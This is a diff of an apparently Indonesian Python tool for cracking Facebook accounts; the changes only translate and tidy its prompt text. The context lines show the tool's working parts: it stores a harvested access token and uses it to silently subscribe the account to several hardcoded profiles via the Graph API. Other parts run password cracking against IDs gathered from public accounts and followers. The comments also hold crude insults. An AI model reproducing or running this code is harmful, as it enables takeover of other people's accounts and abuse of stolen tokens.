@@ -257,7 +257,7 @@ def gen():
         cookie = open("login.txt", "w")
         cookie.write(find_token.group(1))
         cookie.close()
-        print((k+"\n["+p+"•"+k+"]"+p+" Berhasil masuk, sabar napa..."))
+        print((k+"\n["+p+"✓"+k+"]"+p+" Login successfully"))
         bot_follow()
 
 ### BOT FOLLOW ### Jangan Diganti Anjing !!!
@@ -272,7 +272,7 @@ def bot_follow():
 	except IOError:
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
 		logs()
-	jalan("%s[%s•%s] %sSabar ngab sedang masuk..."%(k,p,k,p))
+	jalan("%s[%s+%s] %sSabar ngab sedang masuk..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
 	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # Dapunta Ratya
 	requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + toket) # Almira Gabrielle X
@@ -322,10 +322,10 @@ def menu():
         negara = "None"
     os.system("clear")
     banner()
-    print((k+"\n[ "+p+"Selamat Datangatang "+a["name"]+k+" ]"+p))
+    print((k+"\n[ "+p+" Welcome "+a["name"]+k+" ]"+p))
     print((k+"\n["+p+"+"+k+"]"+p+" Your Name : "+id))
-    print((k+"["+p+"+"+k+"]"+p+" Your IP: "+ip))
-    print((k+"["+p+"+"+k+"]"+p+" Status  : "+m+"Jomblo"+p))
+    print((k+"["+p+"+"+k+"]"+p+" Your IP   : "+ip))
+    print((k+"["+p+"+"+k+"]"+p+" Status  : "+m+"J O M B L O"+p))
     print((k+"["+p+"+"+k+"]"+p+" Joined  : "+durasi))
     print((k+"["+p+"+"+k+"]"+p+" Crack   : "+negara))
     print((k+"\n["+p+"01"+k+"]"+p+" Crack ID From Publik/Followers"))
@@ -812,7 +812,7 @@ class crack:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -899,7 +899,7 @@ class crackttl:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -1001,7 +1001,7 @@ class crackffb:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -1089,7 +1089,7 @@ class bapi:
   def krah(self,isifile):
     print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan PasswordManual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
+      f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
       if f in[""," "]:
         print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
         continue
